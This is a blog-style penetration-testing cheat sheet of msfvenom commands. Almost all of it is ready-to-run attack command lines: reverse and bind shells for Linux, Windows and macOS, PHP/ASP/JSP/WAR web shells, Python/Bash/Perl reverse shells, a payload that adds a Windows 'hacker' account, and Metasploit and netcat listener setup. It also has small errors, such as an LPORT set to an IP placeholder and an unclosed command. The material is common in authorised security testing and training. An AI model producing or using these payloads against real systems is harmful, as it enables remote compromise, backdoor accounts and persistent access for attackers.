---
title:  "Msfvenom Payload Cheat Sheet"
header: "Msfvenom Payload Cheat Sheet"
categories: 
  - Cheatsheet
tags:
  - Msfvenom
---

Msfvenom (replaced the former msfpayload and msfencode tools) and is a tool that can be used to generate payloads as standaline files and encode them if needed. Everybody likes shells, right?

# Usage  
***

Insert picture here

# Basic Commands  
***
#### List available payloads  
`msfvenom -l`

#### Encoding Payloads  
`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

# Handler Setup  
***
#### Meterpreter  
`msfconsole -q`  
`use exploit/multi/handler`  
`set PAYLOAD <PAYLOAD>`  
`set LHOST <IP>`  
`set LPORT <IP>`  
`set ExitOnSession false`  
`exploit -j -z`  

#### Netcat  
`nc -nlvp <PORT>

# Linux  
***
#### Reverse Shell  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf`

#### Bind Shell  
`msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf`

# Windows  
***
#### Reverse Shell  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe`

#### Bind Shell  
`msfvenom -p windows/meterpreter/bind_tcp RHOST= <IP> LPORT=<PORT> -f exe > shell.exe`

#### CMD Shell  
`msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe`

#### User Creation  
`msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe`

# Mac  
***
#### Reverse Shell  
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho`

#### Bind Shell  
`msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho`

# Web Payloads  
***
#### PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php`  
`cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

#### ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp`

#### JSP  
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`

#### WAR  
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`

# Scripting Payloads  
***
#### Python  
`msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py`

#### Bash  
`msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh`

#### Perl  
`msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl`
